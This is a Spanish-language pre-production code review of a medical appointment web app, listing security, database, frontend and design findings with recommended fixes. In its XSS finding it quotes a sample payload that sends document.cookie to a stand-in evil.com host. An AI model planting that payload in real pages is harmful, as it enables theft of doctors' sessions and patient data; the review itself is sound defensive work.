# 🏥 Technical Review: Centro Médico Guzmán — Agenda Médica Virtual

> **Revisión realizada como:** Senior Software Engineer  
> **Fecha de revisión:** 26 de junio de 2026  
> **Stack:** Node.js · Express · Mongoose · MongoDB · Vanilla JS · CSS  
> **Propósito:** Evaluación técnica pre-producción

---

## 📋 Resumen Ejecutivo

El proyecto es un sistema de agenda médica funcional construido con una arquitectura MVC básica sobre Node.js/Express + MongoDB. Muestra buen dominio del stack elegido y cubre todos los requisitos de negocio principales. Sin embargo, presenta deficiencias **críticas en seguridad** (contraseñas en texto plano, ausencia de autenticación real) y problemas estructurales de organización del código frontend que deben resolverse antes de cualquier despliegue en producción.

---

## 1. 🏗️ Arquitectura

### ✅ Lo que funciona bien
- Separación clara de capas: `routes/`, `controllers/`, `models/`, `db/`.
- Un único punto de entrada (`app.js`) limpio y conciso.
- El frontend consume la API con `fetch`, correcta separación cliente/servidor.

---

### 🟠 OBS-ARCH-01 — Un solo archivo JS para dos contextos diferentes

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) |
| **Severidad** | 🟠 Alto |

**Descripción:** El archivo `agendaApp.js` (953 líneas) contiene la lógica completa de **dos interfaces distintas**: el portal de pacientes (`index.html`) y el panel de doctores (`panel.html`). Ambas lógicas se ejecutan en el mismo contexto y se diferencian por la existencia de elementos del DOM.

**Problema técnico:** El bloque `if (authSection || mainAppSection)` y `if (loginDoctorForm || dashboardCard)` son una señal de que el código debería estar separado. Cuando se carga `panel.html`, todo el bloque de lógica de pacientes se inicializa igualmente (aunque los elementos sean `null`), causando referencias nulas silenciosas y ejecutando código innecesario.

**Recomendación:** Dividir en dos archivos: `pacienteApp.js` y `doctorApp.js`. Cada HTML referencia sólo el script que necesita.

---

### 🟡 OBS-ARCH-02 — Lógica de negocio de seed duplicada

| Campo | Detalle |
|---|---|
| **Archivos** | [doctorModel.js](file:///c:/Users/julia/Desktop/Agenda-medica/models/doctorModel.js) · [db/seed.js](file:///c:/Users/julia/Desktop/Agenda-medica/db/seed.js) |
| **Severidad** | 🟡 Medio |

**Descripción:** Los datos de los 5 doctores están hardcodeados en **dos lugares**: dentro de `inicializarDoctores()` en el modelo y en `db/seed.js`. Si un doctor cambia, hay que actualizarlo en dos sitios.

**Recomendación:** Crear un único archivo de constantes `db/datosSemilla.js` que exporte el array de doctores y sea consumido por ambos.

---

### 🟡 OBS-ARCH-03 — Ausencia de capa de servicios (Service Layer)

| Campo | Detalle |
|---|---|
| **Archivos** | [citaController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/citaController.js) |
| **Severidad** | 🟡 Medio |

**Descripción:** Los controladores realizan directamente las consultas a MongoDB y aplican las reglas de negocio. Esto mezcla responsabilidades: el controlador debería sólo recibir la request y enviar la response; la lógica de negocio debería vivir en una capa de servicios (`services/citaService.js`).

**Recomendación:** Crear `services/` con la lógica de negocio extraída, manteniendo los controladores delgados.

---

### 🟢 OBS-ARCH-04 — Ausencia de archivo `.gitignore` verificable

| Campo | Detalle |
|---|---|
| **Severidad** | 🟢 Bajo |

**Descripción:** No se detectó un archivo `.gitignore` explícito. El archivo `.env` no debería estar trackeado en el repositorio ya que expone la URI de MongoDB.

**Recomendación:** Crear `.gitignore` con al menos: `node_modules/`, `.env`, `*.log`.

---

## 2. 🖥️ Backend

### ✅ Lo que funciona bien
- Controladores bien nombrados y organizados.
- Manejo de errores con `try/catch` en todos los endpoints.
- Respuestas HTTP con códigos de estado correctos (201, 400, 401, 404, 500).
- Validación de la mayoría de campos requeridos.
- Índice compuesto en `citaModel` para evitar colisiones en base de datos.

---

### 🔴 OBS-BACK-01 — Inyección potencial de RegEx (ReDoS) en login de doctor

| Campo | Detalle |
|---|---|
| **Archivo** | [autenticacionController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/autenticacionController.js) — Línea 16 |
| **Severidad** | 🔴 Crítico |

**Descripción:** El login del doctor construye una expresión regular directamente desde el input del usuario:
```js
nombre: { $regex: new RegExp(`^${nombre.trim()}$`, 'i') }
```
Si un atacante envía un `nombre` con caracteres especiales de regex (ej: `(a+)+`, `[`, `.*`), puede causar un **ReDoS** (Regular Expression Denial of Service), bloqueando el event loop de Node.js.

**Recomendación:** Escapar el input antes de usarlo en regex, o mejor aún, hacer la búsqueda exacta por `codigoEmpleado` (que es único) y luego comparar el nombre en JavaScript:
```js
const doctor = await Doctor.findOne({ codigoEmpleado: codigoEmpleado.trim() });
if (!doctor || doctor.nombre.toLowerCase() !== nombre.trim().toLowerCase()) { ... }
```

---

### 🟠 OBS-BACK-02 — Sin validación de formato de fecha en el backend

| Campo | Detalle |
|---|---|
| **Archivo** | [citaController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/citaController.js) — Líneas 40-43 |
| **Severidad** | 🟠 Alto |

**Descripción:** La función `obtenerDiaDeLaSemana` asume que el string de fecha tiene el formato `YYYY-MM-DD`. Si se envía un formato inválido (ej: `"hola"`, `"2026/06/26"`, `undefined`), el `new Date()` devolverá `NaN` y `.getDay()` retornará `NaN`, lo que haría que las validaciones de días laborables fallen silenciosamente (NaN !== 0 y NaN !== 6, por lo que cualquier fecha pasaría la validación).

**Recomendación:** Agregar validación de formato de fecha:
```js
const FECHA_REGEX = /^\d{4}-\d{2}-\d{2}$/;
if (!FECHA_REGEX.test(fecha)) {
  return res.status(400).json({ error: 'Formato de fecha inválido. Use YYYY-MM-DD.' });
}
```

---

### 🟠 OBS-BACK-03 — Sin validación de rango en edadPaciente

| Campo | Detalle |
|---|---|
| **Archivo** | [citaController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/citaController.js) — Líneas 29-31 |
| **Severidad** | 🟠 Alto |

**Descripción:** El backend acepta cualquier número como `edadPaciente`, incluyendo valores negativos (-50), extremos (999) o NaN si el parse falla. El HTML tiene `min="0" max="120"` pero estas restricciones se bypass fácilmente con curl o Postman.

**Recomendación:**
```js
const edad = parseInt(edadPaciente, 10);
if (isNaN(edad) || edad < 0 || edad > 120) {
  return res.status(400).json({ error: 'La edad debe ser un número entre 0 y 120.' });
}
```

---

### 🟠 OBS-BACK-04 — Sin validación de formato de correo en el backend

| Campo | Detalle |
|---|---|
| **Archivos** | [citaController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/citaController.js) · [autenticacionController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/autenticacionController.js) |
| **Severidad** | 🟠 Alto |

**Descripción:** El backend no valida que `correoPaciente` tenga formato de email. Es posible insertar citas con correos inválidos como `"abc"` o `""` (string vacío que pasa el check `!correoPaciente`).

**Recomendación:** Usar una regex simple o el módulo `validator` para verificar el formato.

---

### 🟡 OBS-BACK-05 — Lógica de días y restricciones duplicada entre crearCita y obtenerHorasDisponibles

| Campo | Detalle |
|---|---|
| **Archivo** | [citaController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/citaController.js) |
| **Severidad** | 🟡 Medio |

**Descripción:** La lógica de validación (días hábiles, restricción de miércoles) está **duplicada** entre `crearCita` (líneas 40-53) y `obtenerHorasDisponibles` (líneas 159-167). Una futura modificación (ej: agregar restricción de jueves) requeriría actualizar ambas funciones.

**Recomendación (DRY):** Extraer estas validaciones a funciones helper reutilizables:
```js
const esDiaHabil = (fecha) => { ... };
const esEspecialidadDisponibleEnFecha = (especialidad, fecha) => { ... };
```

---

### 🟡 OBS-BACK-06 — Manejo de errores no diferencia tipos de falla

| Campo | Detalle |
|---|---|
| **Archivo** | Todos los controladores |
| **Severidad** | 🟡 Medio |

**Descripción:** Los bloques `catch` de todos los controladores hacen un log genérico y devuelven siempre un 500 genérico. Errores de validación de Mongoose (ej: violación del índice único) devolverán un 500 en lugar de un 409 Conflict.

**Recomendación:** Diferenciar errores de Mongoose:
```js
} catch (error) {
  if (error.code === 11000) {
    return res.status(409).json({ error: 'Ya existe un registro con estos datos.' });
  }
  return res.status(500).json({ error: 'Error interno del servidor.' });
}
```

---

### 🟢 OBS-BACK-07 — La función inicializarDoctores mezcla responsabilidades con el modelo

| Campo | Detalle |
|---|---|
| **Archivo** | [doctorModel.js](file:///c:/Users/julia/Desktop/Agenda-medica/models/doctorModel.js) — Líneas 26-44 |
| **Severidad** | 🟢 Bajo |

**Descripción:** Un modelo de Mongoose debería definir el esquema y las operaciones del modelo. La función `inicializarDoctores` con datos hardcodeados es lógica de seed que no debería vivir en el modelo.

**Recomendación:** Mover `inicializarDoctores` a `db/seed.js` o a un módulo separado `db/inicializador.js`.

---

## 3. 🗄️ Base de Datos (MongoDB)

### ✅ Lo que funciona bien
- Índice compuesto `{ fecha, hora, codigoEmpleadoDoctor }` como garantía de unicidad a nivel de BD.
- Uso de `enum` para el campo `estado` en `citaModel`.
- Normalización correcta: los doctores son documentos separados.
- Conexión centralizada en `db/conexion.js`.

---

### 🔴 OBS-DB-01 — El índice único en citaModel tiene una brecha de diseño crítica

| Campo | Detalle |
|---|---|
| **Archivo** | [citaModel.js](file:///c:/Users/julia/Desktop/Agenda-medica/models/citaModel.js) — Línea 54 |
| **Severidad** | 🔴 Crítico |

**Descripción:** El índice único `{ fecha, hora, codigoEmpleadoDoctor }` no considera el campo `estado`. Esto significa que cuando una cita se "cancela" (estado = 'cancelada'), ese slot de fecha/hora/doctor **sigue bloqueado permanentemente** a nivel de base de datos. El controlador omite `canceladas` en la búsqueda de conflictos, pero el índice único de MongoDB rechazará la inserción de cualquier nueva cita en ese slot, incluso si la cita original está cancelada.

**Esto es un bug de producción**: si el doctor cancela una cita, nadie más podrá reservar ese mismo horario.

**Recomendación:** 
- Opción A: Eliminar el índice compuesto único y confiar únicamente en las validaciones del controlador.
- Opción B: Hacer el borrado físico de citas canceladas en lugar de cambiar el estado.
- Opción C: Usar un índice parcial (disponible en MongoDB 3.2+):
```js
citaSchema.index(
  { fecha: 1, hora: 1, codigoEmpleadoDoctor: 1 },
  { unique: true, partialFilterExpression: { estado: { $ne: 'cancelada' } } }
);
```

---

### 🟠 OBS-DB-02 — Desnormalización excesiva: datos del paciente duplicados en cada cita

| Campo | Detalle |
|---|---|
| **Archivo** | [citaModel.js](file:///c:/Users/julia/Desktop/Agenda-medica/models/citaModel.js) |
| **Severidad** | 🟠 Alto |

**Descripción:** El esquema de `Cita` almacena `nombrePaciente`, `edadPaciente`, `correoPaciente` y `telefonoPaciente` de forma redundante en cada cita. Si un paciente cambia su teléfono, todas las citas históricas tienen el dato antiguo. Esta desnormalización también impide operaciones como "encontrar todas las citas de un paciente por ID".

**Recomendación:** Agregar referencia al usuario:
```js
paciente: { type: mongoose.Schema.Types.ObjectId, ref: 'Usuario', required: true }
```
Y mantener sólo los datos críticos para la cita (nombre, teléfono de contacto al momento de la reserva) como snapshot.

---

### 🟠 OBS-DB-03 — Ausencia de índices en campos de búsqueda frecuente

| Campo | Detalle |
|---|---|
| **Archivo** | [citaModel.js](file:///c:/Users/julia/Desktop/Agenda-medica/models/citaModel.js) |
| **Severidad** | 🟠 Alto |

**Descripción:** Las queries más frecuentes buscan por `correoPaciente` y `codigoEmpleadoDoctor`, pero no hay índices en estos campos. Con volúmenes grandes de datos, MongoDB realizará **full collection scans** en cada operación.

**Recomendación:** Agregar índices:
```js
citaSchema.index({ correoPaciente: 1 });
citaSchema.index({ codigoEmpleadoDoctor: 1, fecha: 1 });
```

---

### 🟠 OBS-DB-04 — Uso de String para fecha en lugar de Date

| Campo | Detalle |
|---|---|
| **Archivo** | [citaModel.js](file:///c:/Users/julia/Desktop/Agenda-medica/models/citaModel.js) — Línea 25 |
| **Severidad** | 🟠 Alto |

**Descripción:** El campo `fecha` se almacena como `String` (`'YYYY-MM-DD'`). Aunque el comentario justifica esto para evitar problemas de zona horaria, impide usar operaciones de fecha nativas de MongoDB como `$gt`, `$lt`, rangos de fechas o aggregations temporales eficientes. Las queries de rango de fechas con String son comparaciones lexicográficas.

**Recomendación:** Usar `Date` con el timezone configurado explícitamente, o mantener el String pero documentar claramente las limitaciones y usar el índice adecuado.

---

### 🟡 OBS-DB-05 — Sin validación de longitud o formato en campos String del modelo

| Campo | Detalle |
|---|---|
| **Archivos** | Todos los modelos |
| **Severidad** | 🟡 Medio |

**Descripción:** Los campos `String` no tienen restricciones de longitud mínima ni máxima (`minlength`, `maxlength`). Un atacante podría insertar un diagnóstico con 1MB de texto, saturando la base de datos.

**Recomendación:**
```js
diagnostico: { type: String, default: '', maxlength: 2000 },
nombrePaciente: { type: String, required: true, trim: true, maxlength: 100 }
```

---

### 🟡 OBS-DB-06 — Sin validación de correo electrónico en el modelo de Usuario

| Campo | Detalle |
|---|---|
| **Archivo** | [usuarioModel.js](file:///c:/Users/julia/Desktop/Agenda-medica/models/usuarioModel.js) |
| **Severidad** | 🟡 Medio |

**Descripción:** El campo `correo` acepta cualquier string. Mongoose permite agregar validaciones con `match`:
```js
correo: {
  type: String,
  required: true,
  unique: true,
  trim: true,
  match: [/^\S+@\S+\.\S+$/, 'Formato de correo inválido']
}
```

---

## 4. 🎨 Frontend

### ✅ Lo que funciona bien
- Diseño oscuro y moderno con glassmorphism bien ejecutado.
- Sistema de variables CSS consistente con tokens de diseño.
- Animaciones `fadeInUp`/`fadeInDown` fluidas.
- Buena accesibilidad semántica con `<header>`, `<form>`, `<label>`.
- El calendario semanal y mensual son componentes visuales bien construidos.
- Uso correcto de `encodeURIComponent` en parámetros de URL.
- Campos del formulario con atributos `required`, `type` correctos.

---

### 🔴 OBS-FE-01 — XSS (Cross-Site Scripting) en renderizado dinámico con innerHTML

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) — Múltiples líneas |
| **Severidad** | 🔴 Crítico |

**Descripción:** En múltiples lugares se inserta contenido proveniente de la API directamente en `innerHTML` sin sanitizar:

```js
// Línea 930 - diagnóstico inyectado directamente en el DOM
${cita.diagnostico}
// Línea 892 - datos del historial sin sanitizar
<div>${h.diagnostico}</div>
```

Si un atacante logra guardar un diagnóstico como `<script>alert('XSS')</script>` o `<img onerror="fetch('http://evil.com/steal?c='+document.cookie)">`, este código **se ejecutará en el navegador de cualquier doctor** que abra esa cita.

**Recomendación:** Nunca usar `innerHTML` con datos del servidor. Usar `innerText`/`textContent` para texto plano, o una librería de sanitización como `DOMPurify`:
```js
item.querySelector('.diagnostico').textContent = h.diagnostico;
```

---

### 🟠 OBS-FE-02 — Mapa de doctores hardcodeado en el cliente

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) — Líneas 273-279 |
| **Severidad** | 🟠 Alto |

**Descripción:** Al confirmar una cita, el nombre del doctor se obtiene de un objeto literal hardcodeado en el frontend:
```js
const doctores = {
  'Pediatría': 'Dr. Carlos Mendoza',
  // ...
};
```
Si se modifica un doctor en la base de datos, el frontend mostrará el nombre incorrecto sin que haya ningún error visible.

**Recomendación:** El nombre del doctor debería venir en la respuesta del endpoint `/api/citas` o crear un endpoint `GET /api/doctores` para obtenerlos dinámicamente.

---

### 🟠 OBS-FE-03 — Uso de `alert()` nativo en el panel del doctor

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) — Líneas 606, 619, 642, 718, 731 |
| **Severidad** | 🟠 Alto |

**Descripción:** En el panel del doctor se usan `alert()` y `confirm()` nativos del navegador, que bloquean el hilo de ejecución, tienen apariencia inconsistente con el diseño del sistema y en algunos contextos (frames, popups) están deshabilitados por políticas del navegador.

**Recomendación:** Reemplazar con el sistema de notificaciones (`mostrarNotificacionPanel`) ya implementado en el mismo archivo, o crear un modal de confirmación personalizado.

---

### 🟠 OBS-FE-04 — Estilos CSS duplicados entre el archivo CSS principal y los `<style>` inline

| Campo | Detalle |
|---|---|
| **Archivos** | [index.html](file:///c:/Users/julia/Desktop/Agenda-medica/public/index.html) · [panel.html](file:///c:/Users/julia/Desktop/Agenda-medica/public/panel.html) · [agenda.css](file:///c:/Users/julia/Desktop/Agenda-medica/public/estilos_css/agenda.css) |
| **Severidad** | 🟠 Alto |

**Descripción:** Hay estilos definidos en los bloques `<style>` de cada HTML que también existen en `agenda.css` (ej: `.calendar-cell`, `.apt-pill`, `.modal-overlay`, `.tab-btn`, `.dashboard-tabs`). Esto provoca que cambios en una parte no se reflejen en la otra, generando inconsistencias visuales.

**Recomendación:** Centralizar todos los estilos en `agenda.css` o crear archivos CSS separados por página (`paciente.css`, `doctor.css`). Eliminar todos los bloques `<style>` inline de los HTML.

---

### 🟡 OBS-FE-05 — Mutación del objeto Date causa bugs en el calendario semanal

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) — Línea 344 |
| **Severidad** | 🟡 Medio |

**Descripción:** La siguiente línea muta `hoy` de forma permanente:
```js
const lunesSemana = new Date(hoy.setDate(diffAlLunes + (semanaOffset * 7)));
```
`hoy.setDate(...)` modifica el objeto `hoy` en lugar de crear uno nuevo. Si la función se llama nuevamente (al navegar semanas), `hoy` ya no será la fecha actual sino la fecha mutada de la última llamada, causando que el cálculo del lunes sea incorrecto en navegaciones múltiples.

**Recomendación:**
```js
const hoyBase = new Date(); // nueva referencia, no mutable
const lunesSemana = new Date(hoyBase);
lunesSemana.setDate(diffAlLunes + (semanaOffset * 7));
```

---

### 🟡 OBS-FE-06 — Ausencia de estado de carga (loading state) en operaciones async

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) |
| **Severidad** | 🟡 Medio |

**Descripción:** Todas las llamadas a la API se realizan sin deshabilitar el botón ni mostrar un indicador de carga. El usuario puede hacer clic múltiples veces en "Confirmar y Agendar Cita", enviando requests duplicadas al servidor.

**Recomendación:** Deshabilitar el botón al iniciar la request y rehabilitarlo al finalizar:
```js
btnSubmit.disabled = true;
btnSubmit.textContent = 'Procesando...';
// ... await fetch ...
btnSubmit.disabled = false;
btnSubmit.textContent = 'Confirmar y Agendar Cita';
```

---

### 🟡 OBS-FE-07 — Falta meta description para SEO

| Campo | Detalle |
|---|---|
| **Archivos** | [index.html](file:///c:/Users/julia/Desktop/Agenda-medica/public/index.html) · [panel.html](file:///c:/Users/julia/Desktop/Agenda-medica/public/panel.html) |
| **Severidad** | 🟡 Medio |

**Descripción:** No hay `<meta name="description">` ni atributo `lang` correctamente configurado para SEO y accesibilidad básica de lectores de pantalla. Hay `lang="es"` en el HTML, lo cual es correcto.

**Recomendación:** Agregar:
```html
<meta name="description" content="Sistema de agenda médica del Centro Médico Guzmán. Reserve su cita con nuestros especialistas.">
```

---

### 🟢 OBS-FE-08 — El formulario de reserva no restablece el campo edadPaciente correctamente

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) — Líneas 286-288 |
| **Severidad** | 🟢 Bajo |

**Descripción:** Después de crear una cita, se llama `reservaForm.reset()` y luego se restablecen el nombre y correo desde la sesión. Pero el campo `edadPaciente` se vacía con el reset y no se restablece, obligando al usuario a volver a ingresarlo en cada cita.

---

## 5. 🔐 Seguridad

### 🔴 OBS-SEC-01 — Contraseñas en texto plano

| Campo | Detalle |
|---|---|
| **Archivos** | [usuarioModel.js](file:///c:/Users/julia/Desktop/Agenda-medica/models/usuarioModel.js) · [autenticacionController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/autenticacionController.js) — Línea 85 |
| **Severidad** | 🔴 CRÍTICO |

**Descripción:** Las contraseñas de los pacientes se almacenan y comparan en texto plano:
```js
if (!usuario || usuario.contrasena !== contrasena) { ... }
```
Si la base de datos es comprometida, **todas las contraseñas de todos los pacientes quedan expuestas inmediatamente**. Esto viola regulaciones de protección de datos (GDPR, Ley 1581 Colombia).

**Recomendación:** Usar `bcrypt` para hashear contraseñas:
```bash
npm install bcrypt
```
```js
// Al registrar:
const hash = await bcrypt.hash(contrasena, 12);
// Al autenticar:
const valida = await bcrypt.compare(contrasenaIngresada, usuario.contrasena);
```

---

### 🔴 OBS-SEC-02 — Ausencia total de autenticación y autorización en la API

| Campo | Detalle |
|---|---|
| **Archivos** | [agendaRoutes.js](file:///c:/Users/julia/Desktop/Agenda-medica/routes/agendaRoutes.js) |
| **Severidad** | 🔴 CRÍTICO |

**Descripción:** Todos los endpoints de la API (`PUT /citas/:id/finalizar`, `DELETE /citas/:id`, etc.) son completamente públicos. Cualquier persona con curl puede:
- Finalizar citas de cualquier doctor con cualquier diagnóstico.
- Borrar cualquier cita del sistema.
- Acceder al historial médico de cualquier paciente conociendo su correo.

No hay middleware de autenticación (JWT, sesiones, etc.) protegiendo ninguna ruta.

**Recomendación:** Implementar JWT (`jsonwebtoken`):
- Login devuelve un token firmado.
- Rutas sensibles requieren middleware `verificarToken`.
- El token incluye el rol (`paciente`, `doctor`) para autorización.

---

### 🔴 OBS-SEC-03 — XSS via innerHTML (repetido desde Frontend)

| Campo | Detalle |
|---|---|
| **Severidad** | 🔴 CRÍTICO |

(Ver OBS-FE-01. Este hallazgo tiene implicaciones de seguridad graves dado que el contexto es el panel del doctor que contiene datos médicos sensibles.)

---

### 🟠 OBS-SEC-04 — Ausencia de rate limiting

| Campo | Detalle |
|---|---|
| **Archivo** | [app.js](file:///c:/Users/julia/Desktop/Agenda-medica/app.js) |
| **Severidad** | 🟠 Alto |

**Descripción:** No hay limitación de peticiones por IP. Los endpoints de login están expuestos a ataques de **fuerza bruta**: un atacante puede intentar millones de combinaciones de contraseña sin restricción alguna.

**Recomendación:**
```bash
npm install express-rate-limit
```
```js
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10 });
router.post('/auth/paciente/login', loginLimiter, autenticacionController.loginPaciente);
```

---

### 🟠 OBS-SEC-05 — Sesión de doctor almacenada en localStorage sin expiración

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) — Línea 545 |
| **Severidad** | 🟠 Alto |

**Descripción:** La "sesión" del doctor (nombre, código, especialidad) se almacena en `localStorage` indefinidamente. `localStorage` es accesible por cualquier JavaScript en la página (por lo tanto, por ataques XSS). No hay timeout de sesión: un doctor que olvida cerrar sesión en un equipo compartido deja su panel expuesto para siempre.

**Recomendación:** Usar `sessionStorage` en lugar de `localStorage` (se limpia al cerrar el tab), o mejor: usar tokens JWT con expiración (`sessionStorage` + backend JWT).

---

### 🟠 OBS-SEC-06 — CORS no configurado

| Campo | Detalle |
|---|---|
| **Archivo** | [app.js](file:///c:/Users/julia/Desktop/Agenda-medica/app.js) |
| **Severidad** | 🟠 Alto |

**Descripción:** No hay política CORS configurada. Por defecto Express no establece headers CORS, lo que puede ser problemático si el frontend se sirve desde un dominio diferente al backend, y no provee ninguna barrera contra peticiones cross-origin maliciosas.

**Recomendación:**
```js
const cors = require('cors');
app.use(cors({ origin: ['https://midominio.com'], credentials: true }));
```

---

### 🟡 OBS-SEC-07 — La URI de MongoDB en .env está en texto plano en el repositorio

| Campo | Detalle |
|---|---|
| **Archivo** | [.env](file:///c:/Users/julia/Desktop/Agenda-medica/.env) |
| **Severidad** | 🟡 Medio |

**Descripción:** El archivo `.env` aparece como tracked en el repositorio de Git y contiene la URI de conexión a MongoDB (aunque en localhost). En producción esto expondría credenciales.

**Recomendación:** Agregar `.env` al `.gitignore` inmediatamente y rotar las credenciales si ya se publicaron.

---

### 🟡 OBS-SEC-08 — Sin Helmet.js para cabeceras de seguridad HTTP

| Campo | Detalle |
|---|---|
| **Archivo** | [app.js](file:///c:/Users/julia/Desktop/Agenda-medica/app.js) |
| **Severidad** | 🟡 Medio |

**Descripción:** No se configuran cabeceras HTTP de seguridad como `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`.

**Recomendación:**
```bash
npm install helmet
```
```js
const helmet = require('helmet');
app.use(helmet());
```

---

## 6. ⚡ Rendimiento

### 🟡 OBS-PERF-01 — Consulta innecesaria a MongoDB para obtener el doctor al crear cita

| Campo | Detalle |
|---|---|
| **Archivo** | [citaController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/citaController.js) — Línea 34 |
| **Severidad** | 🟡 Medio |

**Descripción:** En `crearCita` y `obtenerHorasDisponibles` se hace `Doctor.findOne({ especialidad })` para obtener el `codigoEmpleado`. Dado que sólo hay 5 doctores y raramente cambian, esta es una consulta innecesaria en cada request.

**Recomendación:** Crear un mapa en memoria cacheado en el arranque de la aplicación:
```js
// En app.js al arrancar
const { Doctor } = require('./models/doctorModel');
global.mapaEspecialidadDoctor = {};
Doctor.find().then(doctors => {
  doctors.forEach(d => global.mapaEspecialidadDoctor[d.especialidad] = d.codigoEmpleado);
});
```

---

### 🟡 OBS-PERF-02 — La carga del historial del paciente es síncrona con la apertura del modal

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) — Líneas 876-900 |
| **Severidad** | 🟡 Medio |

**Descripción:** Cada vez que un doctor abre el modal de una cita, se realiza un fetch al servidor para obtener el historial del paciente. Si el servidor tiene latencia, el modal parece "congelado" durante la carga.

**Recomendación:** El estado de carga (`"Cargando..."`) ya está implementado, lo cual es correcto. Mejorar con un spinner visual y tiempo de timeout.

---

### 🟢 OBS-PERF-03 — El CSS importa una fuente de Google Fonts en cada carga

| Campo | Detalle |
|---|---|
| **Archivo** | [agenda.css](file:///c:/Users/julia/Desktop/Agenda-medica/public/estilos_css/agenda.css) — Línea 2 |
| **Severidad** | 🟢 Bajo |

**Descripción:** `@import` dentro de CSS es bloqueante y más lento que `<link>` en el `<head>` del HTML.

**Recomendación:** Mover el `@import` de Google Fonts al `<head>` de los HTML como `<link rel="preconnect">` y `<link rel="stylesheet">`.

---

## 7. 📈 Escalabilidad

### 🟠 OBS-SCALE-01 — Las reglas de negocio están hardcodeadas y no son configurables

| Campo | Detalle |
|---|---|
| **Archivos** | [citaController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/citaController.js) |
| **Severidad** | 🟠 Alto |

**Descripción:** El límite de 5 citas por día, los bloques horarios (`BLOQUES_HORARIOS`), la restricción de miércoles y las especialidades bloqueadas están **codificados directamente** en el controlador. Modificar cualquiera de estas reglas requiere un deploy de código.

**Recomendación:** Extraer a un archivo de configuración `config/reglasNegocio.js` o a una colección de MongoDB `ConfiguracionSistema` para permitir cambios sin tocar el código.

---

### 🟠 OBS-SCALE-02 — La arquitectura no soporta múltiples doctores por especialidad

| Campo | Detalle |
|---|---|
| **Archivos** | Modelos y controladores |
| **Severidad** | 🟠 Alto |

**Descripción:** Todo el sistema asume `unique: true` en `especialidad` del modelo Doctor (1 doctor = 1 especialidad). Agregar un segundo pediatra requeriría cambios en múltiples capas: modelo, controlador (`findOne` por especialidad devolvería sólo 1), y lógica de disponibilidad.

**Recomendación:** Diseñar el sistema para soportar N doctores por especialidad desde el inicio.

---

### 🟡 OBS-SCALE-03 — Sin sistema de logging estructurado

| Campo | Detalle |
|---|---|
| **Archivos** | Todos los controladores |
| **Severidad** | 🟡 Medio |

**Descripción:** Los logs se hacen directamente con `console.log` y `console.error`, sin estructura, sin timestamps, sin niveles de severidad. En producción es imposible filtrar y analizar los logs.

**Recomendación:** Usar `winston` o `pino` para logging estructurado con niveles y persistencia a archivo.

---

## 8. 🧹 Buenas Prácticas

### ✅ Lo que se hace bien
- Uso de `async/await` consistentemente.
- Nombres de variables y funciones en español coherentes con el dominio.
- Comentarios explicativos en puntos clave del código.
- Separación de responsabilidades entre routes/controllers/models (aunque mejorable).
- `.trim()` en los inputs de texto antes de guardar.

---

### 🟠 OBS-BP-01 — Violación de SRP: agendaApp.js maneja demasiadas responsabilidades

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) |
| **Severidad** | 🟠 Alto |

**Descripción:** Un único archivo gestiona: estado de sesión del paciente, estado de sesión del doctor, renderizado del calendario semanal, renderizado del calendario mensual, lógica de modales, validaciones del formulario, y todas las llamadas a la API. Esto viola el principio de Responsabilidad Única (SRP).

---

### 🟡 OBS-BP-02 — Sin tests automatizados en el repositorio

| Campo | Detalle |
|---|---|
| **Severidad** | 🟡 Medio |

**Descripción:** No existen tests unitarios ni de integración en el proyecto. Las validaciones de negocio críticas (restricción de miércoles, límite de 5 citas) no tienen cobertura de tests automatizada.

**Recomendación:** Implementar Jest + Supertest para tests de integración de la API.

---

### 🟡 OBS-BP-03 — El script dev en package.json no usa nodemon

| Campo | Detalle |
|---|---|
| **Archivo** | [package.json](file:///c:/Users/julia/Desktop/Agenda-medica/package.json) |
| **Severidad** | 🟢 Bajo |

**Descripción:** Ambos scripts (`start` y `dev`) son idénticos: `node app.js`. En desarrollo, lo habitual es usar `nodemon` para reinicio automático.

**Recomendación:**
```json
"scripts": {
  "start": "node app.js",
  "dev": "nodemon app.js"
}
```

---

## 9. 🐛 Errores Potenciales

### 🔴 OBS-ERR-01 — Bug confirmado: citas canceladas bloquean el slot para siempre

Ver **OBS-DB-01**. Este es el bug de mayor impacto operativo.

---

### 🟠 OBS-ERR-02 — Race condition al crear citas simultáneas

| Campo | Detalle |
|---|---|
| **Archivo** | [citaController.js](file:///c:/Users/julia/Desktop/Agenda-medica/controllers/citaController.js) — Líneas 62-71 |
| **Severidad** | 🟠 Alto |

